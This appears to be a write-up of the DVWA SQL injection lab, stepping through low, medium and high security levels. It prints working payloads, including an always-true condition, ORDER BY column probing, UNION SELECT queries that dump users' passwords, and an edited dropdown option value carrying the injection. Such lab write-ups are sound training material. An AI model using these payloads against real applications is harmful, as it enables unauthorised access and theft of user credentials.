---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

> ### Objective
> There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi.

## Security Level: Low
> The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any SQL query they wish.
> Spoiler: ?id=a' UNION SELECT "text1","text2";-- -&Submit=Submit.

![1](https://github.com/Knign/Write-ups/assets/110326359/e9488e50-a295-4445-92e8-ee26e477daaa)

- We can provide a user ID `1` to the application.

![2](https://github.com/Knign/Write-ups/assets/110326359/6812920c-1919-4b9a-8f8f-6a8997d27876)

- So the user input is inserted in the following query:
```
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```
- Let's check the source code to see how the application behaves.

![3](https://github.com/Knign/Write-ups/assets/110326359/1c4a41e0-1808-41ca-abb9-32883f28294a)

- As we can see, the user input is not sanitized in any way. This is what leaves an application vulnerable to SQLi.
- Let's provide the following input:
```
1' OR '1'='1
```
- Our input causes the application to create the following query:
```
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```
- As 1 is always equal to 1,  all the users first and last name will be output to the page regardless of whether their id is 1 or not.

![4](https://github.com/Knign/Write-ups/assets/110326359/1a0694a8-b898-4d7e-b214-a034519825fc)

- Our job in not done though, we need to find the passwords for the users using a `UNION` attack.
- For a `UNION` query to work, two key requirements must be met:
	- The individual queries must return the same number of columns.
	- The data types in each column must be compatible between the individual queries.
- We can find the number of columns using the following queries provided by Portswigger one by one:
```
' ORDER BY 1#
' ORDER BY 2# 
' ORDER BY 3#
```
- We will be able to notice that the first two queries do not return any result but the third query returns a blank screen.
- This means that there are two columns in the current table.
- Let's create our final payload:
```
' UNION SELECT user, password FROM users#
```

![5](https://github.com/Knign/Write-ups/assets/110326359/755567c6-553e-4b17-9fa7-ec061bb1a41b)


## Security Level: Medium
> The medium level uses a form of SQL injection protection, with the function of "[mysql_real_escape_string()](https://secure.php.net/manual/en/function.mysql-real-escape-string.php)". However due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered.
> The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form.
> Spoiler: ?id=a UNION SELECT 1,2;-- -&Submit=Submit.

![6](https://github.com/Knign/Write-ups/assets/110326359/e39d6f7b-43ec-4911-b9cc-b66ffc775028)

- Let's first check the source code.

![7](https://github.com/Knign/Write-ups/assets/110326359/c97287bc-87c5-4aef-b115-a098d7bd625a)

- In this level our input is not inserted into quotes.
- We can inspect the code for more information.

![8](https://github.com/Knign/Write-ups/assets/110326359/f34f3bc2-2d37-4ead-93be-d7e5c7b3a154)

- Let's change the `<option>` tag to the following value:
```
<option value="1 OR 1=1">1 OR 1=1</option>
```

![9](https://github.com/Knign/Write-ups/assets/110326359/042d2955-9edb-466d-b046-f32da4b3dc19)

- In order to retrieve the passwords, we can set the `<option>` tag to the following value:
```
<option value="1 UNION SELECT user, password FROM users#">1 UNION SELECT user, password FROM users#</option>
```

![10](https://github.com/Knign/Write-ups/assets/110326359/d218c485-00c4-4f96-bff1-f06d228f94d5)


## Security Level: High
> This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request.
> Spoiler: ID: a' UNION SELECT "text1","text2";-- -&Submit=Submit.

![11](https://github.com/Knign/Write-ups/assets/110326359/bdc9100f-4781-4b24-a326-4459cff1fa83)

- Let's check the source code.

![12](https://github.com/Knign/Write-ups/assets/110326359/6b80b238-038e-4d03-aed2-80ab0cd2a2f3)

- The application treats our input the same way it did in the low security level.
- That means the same payload as the low security level should work in this level.
```
' UNION SELECT user, password FROM users#
```

![13](https://github.com/Knign/Write-ups/assets/110326359/2d077567-4ce3-4bb9-a7d6-377d398ed312)
